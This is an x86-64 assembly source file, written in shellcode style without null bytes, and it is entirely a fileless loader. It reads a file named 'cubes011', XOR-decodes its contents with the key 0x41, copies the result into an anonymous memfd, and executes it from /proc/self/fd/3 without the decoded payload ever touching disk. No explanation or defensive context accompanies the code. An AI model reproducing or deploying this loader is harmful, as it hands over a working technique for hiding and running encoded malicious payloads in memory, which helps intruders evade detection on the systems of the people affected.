global _start

section .text
_start:
	; clear regs
	xor rdi, rdi
	xor rax, rax

	; fopen
	; push blank rdi for null bytes
	push rdi
	mov rdi, 0x3131307365627563
	push rdi
	mov rdi, rsp
	xor rsi, rsi
	xor rdx, rdx
	; open(&"cubes011", 0, 0);
	mov al, 2
	syscall
	
	; fd in rax to r8
	mov r8, rax

	; mmap
	xor rax, rax
	mov al, 9
	xor rdi, rdi
	xor rsi, rsi
	mov sil, 0x1a
	shl rsi, 8
	mov sil, 0x60
	shl rsi, 8
	mov dl, 3
	xor r10, r10
	mov r10b, 2
	xor r9, r9
	mov r9b, 0x40
	shl r9, 8
	; mmap(0, 0x1a6000, 3, 2, 0x4000)
	syscall
	push rax

	; fclose
	mov rdi, r8
	xor rax, rax
	; close(fd)
	mov al, 3
	syscall

	; memfd
	xor rsi, rsi
	push rsi
	mov rdi, rsp
	xor rax, rax
	; memfd(&"", 0)
	mov ax, 319
	syscall
	mov rbx, rax

	; xor mmap
	pop rax
	pop rax
	xor rdi, rdi
	xor rsi, rsi
	xor rdx, rdx
	mov dl, 0x1a
	shl rdx, 8
	mov dl, 0x60
	shl rdx, 8
xor:
	cmp rsi, rdx
	jge memwrite
	mov dil, [rax+rsi]
	xor dil, 0x41
	mov [rax+rsi], dil
	inc rsi
	jmp xor

memwrite:
	; memwrite
	mov rsi, rax
	mov rdi, rbx
	xor rax, rax
	; write(fd, mmap_addr, 0x1a6000)
	inc rax
	syscall

	; execve
	xor rdx, rdx
	xor rsi, rsi
	push rdx
	mov rdi, 0x332f2f64662f666c
	push rdi
	mov rdi, 0x65732f636f72702f
	push rdi
	mov rdi, rsp
	xor rax, rax
	; execve(&"/proc/self/fd/3", 0, 0)
	mov al, 59
	syscall

	; exit
	xor rdi, rdi
	xor rax, rax
	; exit(0)
	mov al, 60
	syscall
